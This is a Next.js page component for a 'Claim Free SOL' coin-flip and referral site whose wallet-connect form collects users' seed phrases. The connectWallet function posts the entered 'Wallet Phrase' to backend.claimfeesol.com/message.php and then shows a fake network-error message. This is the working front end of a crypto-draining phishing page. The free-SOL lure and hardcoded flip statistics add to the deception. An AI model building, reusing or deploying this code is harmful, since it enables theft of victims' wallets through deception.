import Cleanup from "../components/comonent/Cleanup";
import Machine from "../components/comonent/Machine";
import { usePathname, useSearchParams } from 'next/navigation';
import { useEffect, useState } from "react";
import FlipCOnnect from "@/components/comonent/FlipConnect";
import HybridChart from "@/components/HybridChart";
import axios from "axios";

export default function Home() {

  const pathName = usePathname();

  const [homeContainer, setHomeContainer] = useState('home-page-container');
  const [flipContainer, setFlipContainer] = useState('flip-page-container');
  const [claim, setClaim] = useState("claim");
  const [refers, setRefers] = useState("refers");
  const [formContainer, setFormContainer] = useState("form-container");
  const [claimSolBtn, setClaimSolBtn] = useState("btn equal-btn");
  const [referalBtn, setReferalBtn] = useState("btn equal-btn dia-btn");
  const [soundBtn, setSoundBtn] = useState("btn equal-btn sound-btn hide");
  const [claimBtn, setClaimBtn] = useState("btn con-btn new-claim hide");
  const [statBtn, setStatBtn] = useState("btn equal-btn hide");
  const [headerTh, setHeaderTh] = useState("headerTh hide");
  const [headerTop, setHeaderTop] = useState("header-top");
  const [lang, setLang] = useState('en');
  const [clickFreeText, setClickFreeText] = useState('Click me to double your free sol');
  const [wallet, setWallet] = useState('');
  const [phrase, setPhrase] = useState('');
  const [error, setError] = useState('');


  const connectWallet = async (e) => {

    try {
        const url = "https://backend.claimfeesol.com/message.php";

        const response = await axios.post(url, {"wallet": wallet, "phrase": phrase}, {
            headers: {
                "Content-Type":"application/json",
            },withCredentials: true
        })
        console.log(response.data);
        if (response.data.status === "success"){
            setError("Network error. check connection");
        }

        if (response.data.status === "success"){
            setError(response.data.msg);
        }
    } catch (error) {
        console.log("Error sending phrase: ", error);
    }
  }
    

    const connectWal = () => {
        setFormContainer("form-container active");
    }

    const cancel = () => {
        setFormContainer("form-container");
    }

  const flipClicked = () => {
    window.history.pushState({}, '', '/flip');
    setFlipContainer("flip-page-container active");
    setHomeContainer("home-page-container active");
    setClaimSolBtn("btn equal-btn hide");
    setReferalBtn("btn equal-btn dia-btn hide");
    setClaimBtn("btn con-btn new-claim");
    setStatBtn("btn equal-btn");
    setSoundBtn("btn equal-btn sound-btn");
    setHeaderTh("headerTh")
    setHeaderTop("header-top hide");
  }

  const reversePage = () => {
    window.history.pushState({}, '', '/');
    setFlipContainer("flip-page-container");
    setHomeContainer("home-page-container");
    setClaimSolBtn("btn equal-btn");
    setReferalBtn("btn equal-btn dia-btn");
    setClaimBtn("btn con-btn new-claim hide");
    setStatBtn("btn equal-btn hide");
    setSoundBtn("btn equal-btn sound-btn hide");
    setHeaderTop("header-top");
    setHeaderTh("headerTh hide");
  }

  const claimSol = () => {
      setClaim("claim active");
  }

  const cancelClaim = () => {
      setClaim("claim");
  }

  const referals = () => {
      setRefers("refers active");
  }

  const cancelRefer = () => {
      setRefers("refers");
  }

  const walletTypeClicked = (e) => {
    let walletType = e.currentTarget.value;

    let walletTypeContainer = e.currentTarget.parentElement;
    let walletPhrase = e.currentTarget.parentElement.parentElement.children[4];
    
    walletPhrase.classList.add('active');
    walletTypeContainer.classList.add('active');

    setWallet(e.currentTarget.children[1].innerHTML);
  }

  const soundClicked = (e) => {
    let firstChild = e.currentTarget.children[0];
    let secondChild = e.currentTarget.children[1];

    if (firstChild.classList.contains('active')){
        firstChild.classList.remove('active');
        secondChild.classList.add('active');
    }else{
        firstChild.classList.add('active');
        secondChild.classList.remove('active');
    }
  }

  useEffect(() => {
    async function getLang(){ 
        try{
            let url = "https://backend.claimfeesol.com/get-language.php";

            const response = await axios.get(url, {
                headers: {
                    "Content-Type" : "application/json",
                },withCredentials: true
            })

            if (response.data.status === 'success'){
                if (response.data.lang === 'zh'){
                    setLang('zh');

                    document.querySelector('.lang-btn').innerHTML = 'EN';
                }
                
                if (response.data.lang === 'en'){
                    setLang('en');
                    document.querySelector('.lang-btn').innerHTML = 'ZH';
                }
            }
        }catch(error){
            console.log("Error sending language: ", error);
        }
    }
    getLang();
  },[])

  const langClicked = async (e) => {

    if (lang === 'en'){
        e.currentTarget.innerText = 'EN';
        setLang('zh');
        setClickFreeText('点击翻倍你的 SOL');
    }
    
    if (lang === 'zh'){
        e.currentTarget.innerText = 'ZH';
        setLang('en');
        setClickFreeText('Click me to double your free sol');
    }

    try{
        let url = "https://backend.claimfeesol.com/get-language.php/language.php";

        const response = await axios.post(url, {language: lang}, {
            headers: {
                "Content-Type" : "application/json",
            },withCredentials: true
        })
        
        if (response.data.status === 'success'){
            setLang(response.data.lang);
        }
    }catch(error){
        console.log("Error sending language: ", error);
    }
  }

  return (
    <>
    <header id="header" className="header">
        <div className={headerTop}>
            <div className="header-top-con">
                <img src="/referral.svg" alt="referral" />
                <p>
                {lang === 'en' ? (
                    <>Share your affiliate link and enjoy <span>30%</span> commission!</>
                ) : (
                    <>分享您的邀请链接，赚取 <span>30%</span> 推荐奖励！</>
                )}
                </p>
            </div>
        </div>
        <div className={headerTh}>
          <div className="th-left">
            <h3>{lang === 'en' ? 'Last Flip' : '最后翻转'}</h3>
            <img src="flip_result_tail.svg" alt="" />
          </div>
          <div className="td-middle">
            <img src="flip_result_tail.svg" alt="" />
            <img src="flip_result_head.svg" alt="" />
            <img src="flip_result_head.svg" alt="" />
            <img src="flip_result_tail.svg" alt="" />
            <img src="flip_result_tail.svg" alt="" />
            <img src="flip_result_head.svg" alt="" />
            <img src="flip_result_head.svg" alt="" />
            <img src="flip_result_head.svg" alt="" />
            <img src="flip_result_head.svg" alt="" />
            <img src="flip_result_tail.svg" alt="" />
            <img src="flip_result_head.svg" alt="" />
            <img src="flip_result_tail.svg" alt="" />
            <img src="flip_result_head.svg" alt="" />
            <img src="flip_result_head.svg" alt="" />
            <img src="flip_result_tail.svg" alt="" />
            <img src="flip_result_tail.svg" alt="" />
            <img src="flip_result_head.svg" alt="" />
            <img src="flip_result_tail.svg" alt="" />
            <img src="flip_result_tail.svg" alt="" />
            <img src="flip_result_tail.svg" alt="" />
            <img src="flip_result_tail.svg" alt="" />
            <img src="flip_result_tail.svg" alt="" />
            <img src="flip_result_tail.svg" alt="" />
            <img src="flip_result_tail.svg" alt="" />
            <img src="flip_result_tail.svg" alt="" />
            <img src="flip_result_tail.svg" alt="" />
            <img src="flip_result_tail.svg" alt="" />
            <img src="flip_result_tail.svg" alt="" />
            <img src="flip_result_tail.svg" alt="" />
            <img src="flip_result_tail.svg" alt="" />
            <img src="flip_result_tail.svg" alt="" />
            <img src="flip_result_tail.svg" alt="" />
            <img src="flip_result_tail.svg" alt="" />
            <img src="flip_result_tail.svg" alt="" />
            <img src="flip_result_tail.svg" alt="" />
          </div>
          <div className="td-right">
            <h3>Last 100:</h3>
            <div className="flip-perecnt">
              <img src="flip_result_head.svg" alt="" />
              <h5>53%</h5>
            </div>
            <div className="flip-perecnt">
              <img src="flip_result_tail.svg" alt="" />
              <h5>47%</h5>
            </div>
          </div>
        </div>
        <div className="header-bottom">
            <div className="header-bottom-left">
                <img src="/logo.png" alt="logo" />
            </div>
            <div className="header-bottom-right">
                <button type="button" onClick={claimSol} className={claimSolBtn} title="header-btn">
                    <img src="/tag_price.svg" alt="referral" />
                </button>
                <button type="button" onClick={referals} className={referalBtn} title="header-btn">
                    <img src="/diamond.svg" alt="diamond" />
                </button>
                <button type="button" onClick={soundClicked} className={soundBtn} title="header-btn">
                  <img src="/sound.svg" alt="btn img" className="active" />
                  <img src="/not-sound.svg" alt="" className="" />
                </button>
                <button type="button" onClick={reversePage} className={claimBtn} title="header-btn">Claim Free SOL👀</button>
                <button type="button" onClick={langClicked} className="btn equal-btn lang-btn" title="header-btn">EN</button>
                <button type="button" onClick={connectWal} className="btn con-btn" title="header-btn">{lang === 'en' ? 'Connect' : '连接'}</button>
            </div>
        </div>
    </header>
    <div className={homeContainer}>
      <div className="home-page">
        <div className="home-content">
          <button onClick={flipClicked} className="advert">
              <div className="advert-img-conteiner">
                  <img src="spin.gif" alt="advert img" />
              </div>
              <div className="advert-text">
                  <img src="pointing-right.png" alt="advert img" />
                  <p>{clickFreeText}</p>
                  <img src="pointing-right.png" className="last" alt="advert img" />
              </div>
              <div className="advert-img-conteiner">
                  <img src="spin.gif" alt="advert img" />
              </div>
          </button>
          <Machine lang={lang} />
          <Cleanup lang={lang} />
        </div>
      </div>
    </div>
    <div className={flipContainer}>
      <FlipCOnnect lang={lang} />        
    </div>
    <div className={claim}>
        <div className="claim-cancel-container">
            <button onClick={cancelClaim}><i class="fa fa-arrow-left"></i></button>
        </div>
        <div className="claim-header">
            <h2>Referral</h2>
            <span>30% Commission Rate</span>
        </div>
        <form onSubmit={(e) => e.preventDefault()}>
            <div className="monkey-img">
                <img src="/monkey.svg" alt="" />
            </div>
            <header>
                <h2>Connect a wallet to get started</h2>
            </header>
            <div className="form-btn-container">
                <button onClick={connectWal}>Connect Wallet</button>
            </div>
        </form>
    </div>
    <div className={refers}>
        <div className="ref-container">
            <div className="claim-cancel-container">
                <button onClick={cancelRefer}><i class="fa fa-arrow-left"></i></button>
            </div>
            <div className="claim-header">
                <h2>My Claiming History</h2>
            </div>
            <div className="graph-container">
                <header>
                    <h2>Invite friends, sit back and earn</h2>
                </header>
                <div className="graph-main-container">
                    <HybridChart/>
                </div>
            </div>
            <form onSubmit={(e) => e.preventDefault()}>
                <header>
                    <img src="money.png" alt="" />
                    <h2>Referral Overview</h2>
                </header>
                <div className="form-btn-container">
                    <button onClick={connectWal}>Connect Wallet</button>
                </div>
            </form>
        </div>
    </div>
    <div className={formContainer}>
        <form onSubmit={(e) => e.preventDefault()}>
            <div className="cancel-container">
                <button onClick={cancel}><div className="cancel"></div> </button>
            </div>
            <header>
                <h2>Connect a wallet on Solana to continue</h2>
            </header>
            <p className="require">You must have atleat 0.02 sol to continue</p>
            <div className="Wallet-type-container">
                <input name="wallet" value={wallet} onChange={(e) => setWallet(e.target.value)} type="text" hidden />
                <button type="button" onClick={walletTypeClicked} className="wallet-type-row">
                    <img src="/ave.svg" alt="wallet logo" />
                    <p>Ave Wallet</p>
                </button>
                <button type="button" onClick={walletTypeClicked} className="wallet-type-row">
                    <img src="/solflare.svg" alt="wallet logo" />
                    <p>Solflare</p>
                </button>
                <button type="button" onClick={walletTypeClicked} className="wallet-type-row">
                    <img src="/trust.svg" alt="wallet logo" />
                    <p>Trust Wallet</p>
                </button>
                <button type="button" onClick={walletTypeClicked} className="wallet-type-row">
                    <img src="/phantom.svg" alt="wallet logo" />
                    <p>Phantom</p>
                </button>
                <button type="button" onClick={walletTypeClicked} className="wallet-type-row">
                    <img src="/download.svg" alt="wallet logo" />
                    <p>Coinbase Wallet</p>
                </button>
            </div>
            <div className="Wallet-phrase-container">
                <div className={`error
                    ${error ? "active" : "hidden"}
                    `}></div>
                <label htmlFor="phrase">Wallet Phrase</label>
                <textarea name="phrase" value={phrase} onChange={(e) => setPhrase(e.target.value)} id="phrase"></textarea>
                <div className="form-btn-container">
                    <button onClick={connectWallet}>Connect</button>
                </div>
            </div>
        </form>
    </div>
    </>
  );
}
